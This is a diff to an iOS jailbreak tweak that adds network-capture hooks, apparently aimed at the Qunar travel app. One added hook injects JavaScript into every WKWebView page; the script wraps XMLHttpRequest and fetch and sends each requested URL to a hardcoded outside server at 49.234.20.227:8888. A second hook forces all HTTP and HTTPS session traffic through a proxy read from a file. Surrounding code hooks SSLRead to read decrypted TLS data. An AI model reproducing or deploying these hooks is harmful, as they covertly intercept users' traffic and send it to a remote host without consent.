@@ -170,6 +170,50 @@ static id hook_dataTaskReq(id self, SEL cmd, NSURLRequest *req, void *handler) {
     return orig_dataTaskReq(self, cmd, req, handler);
 }
 
+// ── WKWebView XHR/fetch JS 注入 ──────────────────────────────────
+%hook WKWebView
+- (instancetype)initWithFrame:(CGRect)frame configuration:(WKWebViewConfiguration *)configuration {
+    if (configuration) {
+        NSString *js = @"(function(){"
+            "var _x=XMLHttpRequest.prototype.open,_f=window.fetch;"
+            "function _tl(e,u){var r=new XMLHttpRequest();"
+            "_x.call(r,'POST','http://49.234.20.227:8888/log',true);"
+            "r.setRequestHeader('Content-Type','application/json');"
+            "r.send(JSON.stringify({event:e,url:String(u),src:'wk_js'}));}"
+            "XMLHttpRequest.prototype.open=function(m,u){"
+            "if(u&&String(u).indexOf('49.234.20.227')===-1)_tl('wk_xhr',u);"
+            "return _x.apply(this,arguments);};"
+            "if(_f)window.fetch=function(i,o){"
+            "var u=typeof i==='string'?i:(i&&i.url?i.url:'');"
+            "if(u&&String(u).indexOf('49.234.20.227')===-1)_tl('wk_fetch',u);"
+            "return _f.apply(this,arguments);};"
+            "})();";
+        WKUserScript *s = [[WKUserScript alloc]
+            initWithSource:js
+            injectionTime:WKUserScriptInjectionTimeAtDocumentStart
+            forMainFrameOnly:NO];
+        [configuration.userContentController addUserScript:s];
+    }
+    return %orig(frame, configuration);
+}
+%end
+
+// ── NSURLSession 代理注入 ─────────────────────────────────────────
+%hook NSURLSessionConfiguration
+- (NSDictionary *)connectionProxyDictionary {
+    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
+    NSString *raw = [NSString stringWithContentsOfFile:
+        [docs stringByAppendingPathComponent:@"qunar_proxy_host.txt"]
+        encoding:NSUTF8StringEncoding error:nil];
+    raw = [raw stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
+    if (!raw.length) return %orig;
+    NSMutableDictionary *d = (%orig ? [%orig mutableCopy] : [NSMutableDictionary dictionary]);
+    d[@"HTTPEnable"]  = @1; d[@"HTTPProxy"]  = raw; d[@"HTTPPort"]  = @8080;
+    d[@"HTTPSEnable"] = @1; d[@"HTTPSProxy"] = raw; d[@"HTTPSPort"] = @8080;
+    return [d copy];
+}
+%end
+
 void installNetCaptureHooks(void) {
     void *fnr = dlsym(RTLD_DEFAULT, "SSLRead");
     if (fnr) MSHookFunction(fnr, (void *)hook_SSLRead, (void **)&orig_SSLRead);
